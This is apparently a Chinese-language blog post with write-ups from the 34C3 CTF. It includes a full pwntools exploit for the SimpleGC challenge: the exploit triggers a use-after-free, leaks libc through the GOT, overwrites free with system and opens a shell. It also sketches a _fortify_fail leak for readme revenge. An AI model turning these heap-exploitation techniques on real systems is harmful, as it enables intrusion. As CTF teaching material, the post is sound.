{"title":"34c3 summary1","slug":"20180102_34c3_1","date":"2018-01-02T06:31:38.000Z","updated":"2018-01-02T08:13:42.683Z","comments":true,"excerpt":"","content":"<h2 id=\"prefix\"><a href=\"#prefix\" class=\"headerlink\" title=\"prefix\"></a>prefix</h2><p>打国际赛，还是菜的不行。跟着学长们一起学了些东西</p>\n<h2 id=\"SimpleGC\"><a href=\"#SimpleGC\" class=\"headerlink\" title=\"SimpleGC\"></a>SimpleGC</h2><p>一个<code>uaf</code>的洞，一开始本地<code>exp</code>写好了，不过加载<code>2-26</code>的库就不行了，之后才知道是线程处理堆的问题，主要是因为线程垃圾回收机制不理解，</p>\n<p>看<a href=\"http://pages.cs.wisc.edu/~danb/google-perftools-0.98/tcmalloc.html\" target=\"_blank\" rel=\"external\">TCMalloc</a></p>\n<p>这个机制是在2017年10月份发布的<code>libc-2.26</code>才引入的，orz</p>\n<p>基本结构有<br><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">user</span></span></span><br><span class=\"line\"><span class=\"class\">&#123;</span></span><br><span class=\"line\">  __int64 number;</span><br><span class=\"line\">  <span class=\"keyword\">char</span> *name;</span><br><span class=\"line\">  <span class=\"keyword\">char</span> *group_name;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">group</span></span></span><br><span class=\"line\"><span class=\"class\">&#123;</span></span><br><span class=\"line\">  <span class=\"keyword\">char</span> *name;</span><br><span class=\"line\">  __int64 number;</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure></p>\n<p>exp如下：<br><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># coding:utf-8</span></span><br><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">LOCAL = <span class=\"keyword\">True</span></span><br><span class=\"line\">elf = ELF(<span class=\"string\">\"./sgc\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">mmenu</span><span class=\"params\">(io, opt)</span>:</span></span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">\"Action: \"</span>)</span><br><span class=\"line\">    io.sendline(str(opt))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">add_user</span><span class=\"params\">(io, name, groupname, age)</span>:</span></span><br><span class=\"line\">    mmenu(io, <span class=\"number\">0</span>)</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">\"the user's name: \"</span>)</span><br><span class=\"line\">    io.send(name)</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">\"Please enter the user's group: \"</span>)</span><br><span class=\"line\">    io.send(groupname)</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">\"Please enter your age: \"</span>)</span><br><span class=\"line\">    io.sendline(str(age))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">display_group</span><span class=\"params\">(io, groupname)</span>:</span></span><br><span class=\"line\">    mmenu(io, <span class=\"number\">1</span>)</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">\"Enter group name: \"</span>)</span><br><span class=\"line\">    io.send(groupname)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">display_user</span><span class=\"params\">(io, idx)</span>:</span></span><br><span class=\"line\">    mmenu(io, <span class=\"number\">2</span>)</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">\"Enter index: \"</span>)</span><br><span class=\"line\">    io.sendline(str(idx))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">edit_group</span><span class=\"params\">(io, idx, groupname, choice)</span>:</span></span><br><span class=\"line\">    mmenu(io, <span class=\"number\">3</span>)</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">\"Enter index: \"</span>)</span><br><span class=\"line\">    io.sendline(str(idx))</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">\"haring this group(y/n): \"</span>)</span><br><span class=\"line\">    io.sendline(choice)</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">\"Enter new group name: \"</span>)</span><br><span class=\"line\">    io.send(groupname)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">del_user</span><span class=\"params\">(io, idx)</span>:</span></span><br><span class=\"line\">    mmenu(io, <span class=\"number\">4</span>)</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">\"Enter index: \"</span>)</span><br><span class=\"line\">    io.sendline(str(idx))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">exitprog</span><span class=\"params\">(io)</span>:</span></span><br><span class=\"line\">    mmenu(io, <span class=\"number\">5</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> LOCAL:</span><br><span class=\"line\">    menv = &#123;<span class=\"string\">'LD_PRELOAD'</span>: <span class=\"string\">\"./libc-2.26.so\"</span>&#125;</span><br><span class=\"line\">    io = process(<span class=\"string\">\"./sgc\"</span>, env=menv)</span><br><span class=\"line\">    <span class=\"comment\">#libc = ELF(\"/lib/x86_64-linux-gnu/libc.so.6\")</span></span><br><span class=\"line\">    libc = ELF(<span class=\"string\">\"./libc-2.26.so\"</span>)</span><br><span class=\"line\"><span class=\"keyword\">else</span>:</span><br><span class=\"line\">    io = remote(<span class=\"string\">\"35.198.130.245\"</span>, <span class=\"number\">1337</span>)</span><br><span class=\"line\">    libc = ELF(<span class=\"string\">\"./libc-2.26.so\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 这里就是为了让线程中的fastbin放回到主线程里</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">4</span>):</span><br><span class=\"line\">    add_user(io, <span class=\"string\">'a'</span>*<span class=\"number\">0x8</span>+<span class=\"string\">'useri\\n'</span>, <span class=\"string\">'loopgrouploopg\\n'</span>, <span class=\"number\">233</span>)</span><br><span class=\"line\">    del_user(io, <span class=\"number\">0</span>)</span><br><span class=\"line\"><span class=\"comment\"># 添加4个用户</span></span><br><span class=\"line\">add_user(io, <span class=\"string\">'a'</span>*<span class=\"number\">0x8</span>+<span class=\"string\">'user0\\n'</span>, <span class=\"string\">'0000group0\\n'</span>, <span class=\"number\">233</span>)</span><br><span class=\"line\">add_user(io, <span class=\"string\">'a'</span>*<span class=\"number\">0x8</span>+<span class=\"string\">'user1\\n'</span>, <span class=\"string\">'0000group1\\n'</span>, <span class=\"number\">233</span>)    <span class=\"comment\">#1</span></span><br><span class=\"line\">add_user(io, <span class=\"string\">'a'</span>*<span class=\"number\">0x8</span>+<span class=\"string\">'user2\\n'</span>, <span class=\"string\">'0000group2\\n'</span>, <span class=\"number\">233</span>)    <span class=\"comment\">#2</span></span><br><span class=\"line\">add_user(io, <span class=\"string\">'a'</span>*<span class=\"number\">0x8</span>+<span class=\"string\">'user3\\n'</span>, <span class=\"string\">'0000group3\\n'</span>, <span class=\"number\">233</span>)</span><br><span class=\"line\"><span class=\"comment\"># tigger use after free</span></span><br><span class=\"line\">edit_group(io, <span class=\"number\">0</span>, <span class=\"string\">'0000group1\\n'</span>, <span class=\"string\">'y'</span>)</span><br><span class=\"line\">del_user(io, <span class=\"number\">0</span>) <span class=\"comment\"># ptr to(group1,2) will be del</span></span><br><span class=\"line\">sleep(<span class=\"number\">1</span>)    <span class=\"comment\"># wait to free</span></span><br><span class=\"line\">add_user(io, <span class=\"string\">'a'</span>*<span class=\"number\">0x8</span>+<span class=\"string\">'user4\\n'</span>, <span class=\"string\">'0000group4\\n'</span>, <span class=\"number\">233</span>)    <span class=\"comment\">#0</span></span><br><span class=\"line\">add_user(io, <span class=\"string\">'a'</span>*<span class=\"number\">0x40</span>+<span class=\"string\">'fishu0000\\n'</span>, <span class=\"string\">'0000group4\\n'</span>, <span class=\"number\">233</span>)</span><br><span class=\"line\">add_user(io, <span class=\"string\">'a'</span>*<span class=\"number\">0x10</span>+<span class=\"string\">'usern\\n'</span>, <span class=\"string\">'0000group4\\n'</span>, <span class=\"number\">233</span>)</span><br><span class=\"line\"><span class=\"comment\"># change pointer to got and leak</span></span><br><span class=\"line\">edit_group(io, <span class=\"number\">1</span>, <span class=\"string\">'/bin/sh\\x00'</span>+p64(elf.got[<span class=\"string\">\"free\"</span>])+p64(elf.got[<span class=\"string\">\"free\"</span>]), <span class=\"string\">'y'</span>)</span><br><span class=\"line\">display_user(io, <span class=\"number\">5</span>)</span><br><span class=\"line\">io.recvuntil(<span class=\"string\">\"Name: \"</span>)</span><br><span class=\"line\">data = io.recvline()[:<span class=\"number\">-1</span>]</span><br><span class=\"line\">free_addr = u64(data.ljust(<span class=\"number\">8</span>, chr(<span class=\"number\">0</span>)))</span><br><span class=\"line\">log.info(<span class=\"string\">\"free: \"</span>+hex(free_addr))</span><br><span class=\"line\">libc.address = free_addr - libc.symbols[<span class=\"string\">\"free\"</span>]</span><br><span class=\"line\">log.info(<span class=\"string\">\"libc: \"</span>+hex(libc.address))</span><br><span class=\"line\"><span class=\"comment\"># change free got</span></span><br><span class=\"line\">edit_group(io, <span class=\"number\">5</span>, p64(libc.symbols[<span class=\"string\">\"system\"</span>])[:<span class=\"number\">-1</span>]+<span class=\"string\">'\\n'</span>, <span class=\"string\">'y'</span>)</span><br><span class=\"line\">del_user(io, <span class=\"number\">5</span>)</span><br><span class=\"line\">io.interactive()</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"readme-revenge\"><a href=\"#readme-revenge\" class=\"headerlink\" title=\"readme revenge\"></a>readme revenge</h2><p><a href=\"https://github.com/r00ta/myWriteUps/tree/master/34C32017/pwn_readme_revenge\" target=\"_blank\" rel=\"external\">wp1</a> 里讲的很清除了。</p>\n<p>这是一种方法，做的时候通过不断的填数据(<code>cyclic(size)</code>) 就能达到崩溃，稍微分析一下代码就能够知道怎么控制<code>rip</code>了，但是这里能控制的只有<code>rip</code>，其他寄存器难以控制，无法<code>getshell</code>(笑)，所以可以利用<code>_fortify_fail</code>这个东西(<code>_libc_argv</code>恰好是能覆盖的)，打印出flag来，所以这个题目叫readme(还带revenge)。</p>\n<p>其实这个还能<code>getshell</code>(队长好强)。出题人也没想到能<code>getshell</code>，所以<code>flag</code>是放再全局变量里的。。。</p>\n<p>具体就是找到一个能够控制<code>ax</code>的寄存器的地方，并且能够在这之后执行<code>xhcg eax, esp</code>的一段指令，之后即可<code>rop</code>来<code>getshell</code></p>\n<p>exp就不贴了(23333)</p>\n<h2 id=\"wasm\"><a href=\"#wasm\" class=\"headerlink\" title=\"wasm\"></a>wasm</h2><p>一个很奇葩的题（re除了最简单的好像就没个正常的题），找到了开发者的<a href=\"https://github.com/WebAssembly/wabt\" target=\"_blank\" rel=\"external\">wabt</a>。</p>\n<p>解码成<code>WebAssembly text format</code>，找到<code>check</code> flag的函数，打工1k行。orz。还是不知道怎么搞，代码太长</p>\n<p>to be continued…</p>\n<h2 id=\"babyvm\"><a href=\"#babyvm\" class=\"headerlink\" title=\"babyvm\"></a>babyvm</h2><p>to be continued…</p>\n","primarycolor":"cyan","accentcolor":"cyan","categories":[{"name":"Binary","path":"api/categories/Binary.json"}],"tags":[{"name":"Pwn","path":"api/tags/Pwn.json"}]}